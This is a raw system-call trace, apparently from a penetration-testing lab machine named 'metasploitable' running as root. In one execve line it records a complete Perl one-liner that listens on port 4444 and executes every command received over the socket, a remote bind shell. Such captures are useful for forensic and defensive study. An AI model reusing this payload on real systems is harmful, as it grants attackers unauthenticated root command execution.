\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11806 20:20:26.572614 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
11806 20:20:26.572632 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e11000
11806 20:20:26.572643 mmap2(0xb7e19000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e19000
11806 20:20:26.572660 close(1)          = 0
11806 20:20:26.572672 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11806 20:20:26.572685 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
11806 20:20:26.572734 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11806 20:20:26.572853 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11806 20:20:26.572869 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e06000
11806 20:20:26.572881 mmap2(0xb7e0f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e0f000
11806 20:20:26.572898 close(1)          = 0
11806 20:20:26.572918 munmap(0xb7fc1000, 29913) = 0
11806 20:20:26.572934 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
11806 20:20:26.572948 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11806 20:20:26.572960 _llseek(1, 0, [0], SEEK_CUR) = 0
11806 20:20:26.572971 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
11806 20:20:26.572987 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fc8000
11806 20:20:26.572998 _llseek(1, 1624, [1624], SEEK_SET) = 0
11806 20:20:26.573012 munmap(0xb7fc8000, 1624) = 0
11806 20:20:26.573022 close(1)          = 0
11806 20:20:26.573050 getpgrp()         = 3831
11806 20:20:26.573060 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
11806 20:20:26.573075 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
11806 20:20:26.573090 brk(0x8101000)    = 0x8101000
11806 20:20:26.573122 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.573136 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.573150 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11806 20:20:26.573219 brk(0x8102000)    = 0x8102000
11806 20:20:26.573287 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11806 20:20:26.573306 stat64("/sbin/AB", 0xbf92cf88) = -1 ENOENT (No such file or directory)
11806 20:20:26.573327 stat64("/bin/AB", 0xbf92cf88) = -1 ENOENT (No such file or directory)
11806 20:20:26.573339 stat64("/usr/sbin/AB", 0xbf92cf88) = -1 ENOENT (No such file or directory)
11806 20:20:26.573351 stat64("/usr/bin/AB", 0xbf92cf88) = -1 ENOENT (No such file or directory)
11806 20:20:26.573378 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11806 20:20:26.573392 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e3c6f8) = 11807
11807 20:20:26.573441 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11807 20:20:26.573458 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11807 20:20:26.573470 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11807 20:20:26.573482 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11807 20:20:26.573499 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11807 20:20:26.573515 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11807 20:20:26.573528 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11807 20:20:26.573583 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
11807 20:20:26.573596 --- SIGPIPE (Broken pipe) @ 0 (0) ---
11807 20:20:26.573662 exit_group(127)   = ?
11806 20:20:26.639162 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:26.639162 --- SIGCHLD (Child exited) @ 0 (0) ---
11806 20:20:26.639162 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 11807
11806 20:20:26.639163 waitpid(-1,  <unfinished ...>
4519  20:20:26.639163 waitpid(11806,  <unfinished ...>
11806 20:20:26.639163 <... waitpid resumed> 0xbf92cc08, WNOHANG) = -1 ECHILD (No child processes)
11806 20:20:26.709564 sigreturn()       = ? (mask now [])
11806 20:20:26.709755 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11806 20:20:26.709837 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:26.709874 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11806 20:20:26.709901 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
11806 20:20:26.709931 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:26.709945 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11806 20:20:26.709982 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11806 20:20:26.710003 stat64("/sbin/perl", 0xbf92cfb8) = -1 ENOENT (No such file or directory)
11806 20:20:26.710017 stat64("/bin/perl", 0xbf92cfb8) = -1 ENOENT (No such file or directory)
11806 20:20:26.710030 stat64("/usr/sbin/perl", 0xbf92cfb8) = -1 ENOENT (No such file or directory)
11806 20:20:26.710041 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11806 20:20:26.710059 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11806 20:20:26.710085 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11806 20:20:26.710099 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e3c6f8) = 11808
11808 20:20:26.769888 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11808 20:20:26.769950 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11808 20:20:26.769974 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11808 20:20:26.769989 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11808 20:20:26.770006 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11808 20:20:26.770022 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11808 20:20:26.770034 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11808 20:20:26.770072 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
11808 20:20:26.770169 brk(0)            = 0x8153000
11808 20:20:26.770190 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.770207 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa1000
11808 20:20:26.770223 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.770247 open("/etc/ld.so.cache", O_RDONLY) = 1
11808 20:20:26.770260 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11808 20:20:26.770277 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f99000
11808 20:20:26.770288 close(1)          = 0
11808 20:20:26.770313 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.770360 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11808 20:20:26.770390 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11808 20:20:26.770498 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11808 20:20:26.770515 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f95000
11808 20:20:26.770527 mmap2(0xb7f97000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f97000
11808 20:20:26.770543 close(1)          = 0
11808 20:20:26.770554 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.770568 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
11808 20:20:26.770582 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
11808 20:20:26.770667 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
11808 20:20:26.770684 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f70000
11808 20:20:26.770696 mmap2(0xb7f93000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f93000
11808 20:20:26.770711 close(1)          = 0
11808 20:20:26.770722 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.770736 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
11808 20:20:26.770751 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
11808 20:20:26.770994 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
11808 20:20:26.771012 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6f000
11808 20:20:26.771025 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f57000
11808 20:20:26.771036 mmap2(0xb7f6b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f6b000
11808 20:20:26.771050 mmap2(0xb7f6d000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f6d000
11808 20:20:26.771064 close(1)          = 0
11808 20:20:26.771075 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.771088 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11808 20:20:26.771102 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11808 20:20:26.771188 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11808 20:20:26.771206 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e08000
11808 20:20:26.771217 mmap2(0xb7f51000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f51000
11808 20:20:26.771231 mmap2(0xb7f54000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f54000
11808 20:20:26.771244 close(1)          = 0
11808 20:20:26.771255 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11808 20:20:26.771268 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
11808 20:20:26.771282 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
11808 20:20:26.771383 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
11808 20:20:26.771430 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd6000
11808 20:20:26.771461 mmap2(0xb7ddf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7ddf000
11808 20:20:26.771490 mmap2(0xb7de1000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7de1000
11808 20:20:26.771503 close(1)          = 0
11808 20:20:26.771527 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd5000
11808 20:20:26.771540 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dd58c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11808 20:20:26.771599 mprotect(0xb7f51000, 4096, PROT_READ) = 0
11808 20:20:26.771624 munmap(0xb7f99000, 29913) = 0
11808 20:20:26.771637 set_tid_address(0xb7dd5908) = 11808
11808 20:20:26.771646 set_robust_list(0xb7dd5910, 0xc) = 0
11808 20:20:26.771656 futex(0xbfd4f1f0, 0x81 /* FUTEX_??? */, 1) = 0
11808 20:20:26.771672 rt_sigaction(SIGRTMIN, {0xb7f5b2c0, [], SA_SIGINFO}, NULL, 8) = 0
11808 20:20:26.771685 rt_sigaction(SIGRT_1, {0xb7f5b340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
11808 20:20:26.771697 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
11808 20:20:26.771711 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
11808 20:20:26.771730 uname({sys="Linux", node="metasploitable", ...}) = 0
11808 20:20:26.771776 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
11808 20:20:26.771821 brk(0)            = 0x8153000
11808 20:20:26.771831 brk(0x8174000)    = 0x8174000
11808 20:20:26.771863 getuid32()        = 0
11808 20:20:26.771864 geteuid32()       = 0
11808 20:20:26.771864 getgid32()        = 0
11808 20:20:26.771864 getegid32()       = 0
11808 20:20:26.771903 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db4000
11808 20:20:26.771932 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
11808 20:20:26.771949 read(1, "\325\310\361\253", 4) = 4
11808 20:20:26.771963 close(1)          = 0
11808 20:20:26.771980 time(NULL)        = 1495671626
11808 20:20:26.772023 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfd4eec0) = -1 ENOENT (No such file or directory)
11808 20:20:26.772040 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfd4eec0) = -1 ENOENT (No such file or directory)
11808 20:20:26.772053 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfd4eec0) = -1 ENOENT (No such file or directory)
11808 20:20:26.772068 stat64("/usr/local/lib/perl/5.8.7", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772080 stat64("/usr/local/share/perl/5.8.7", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772092 stat64("/usr/local/lib/perl/5.8.6", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772103 stat64("/usr/local/share/perl/5.8.6", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772115 stat64("/usr/local/lib/perl/5.8.4", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772126 stat64("/usr/local/share/perl/5.8.4", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772138 stat64("/usr/local/lib/perl/5.8.3", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772149 stat64("/usr/local/share/perl/5.8.3", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772160 stat64("/usr/local/lib/perl/5.8.2", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772176 stat64("/usr/local/share/perl/5.8.2", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772188 stat64("/usr/local/lib/perl/5.8.1", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772236 stat64("/usr/local/share/perl/5.8.1", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772248 stat64("/usr/local/lib/perl/5.8.0", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772276 stat64("/usr/local/share/perl/5.8.0", 0xbfd4f000) = -1 ENOENT (No such file or directory)
11808 20:20:26.772301 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ecf8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.772315 _llseek(0, 0, [0], SEEK_CUR) = 0
